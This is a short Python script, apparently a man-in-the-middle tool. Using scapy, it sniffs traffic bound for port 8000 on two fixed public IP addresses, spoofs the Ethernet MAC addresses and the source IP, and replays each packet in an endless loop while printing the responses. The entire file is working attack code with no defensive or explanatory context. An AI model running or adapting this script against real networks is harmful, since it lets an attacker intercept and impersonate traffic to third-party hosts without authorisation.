from scapy.all import *


def mid_attack():
    pkg = sniff(filter='(dst net 182.254.41.37 and dst port 8000) or (dst net 182.254.41.36 and port 8000)', count=1)
    pkg = pkg[0]
    pkg.src = '80:fa:5b:26:a6:89'
    pkg.dst = '3c:94:d5:36:20:d0'
    pkg.payload.src = '192.168.33.7'
    rec = srp(pkg)
    rec[0][0][1].show()


if __name__ == '__main__':
    while True:
        mid_attack()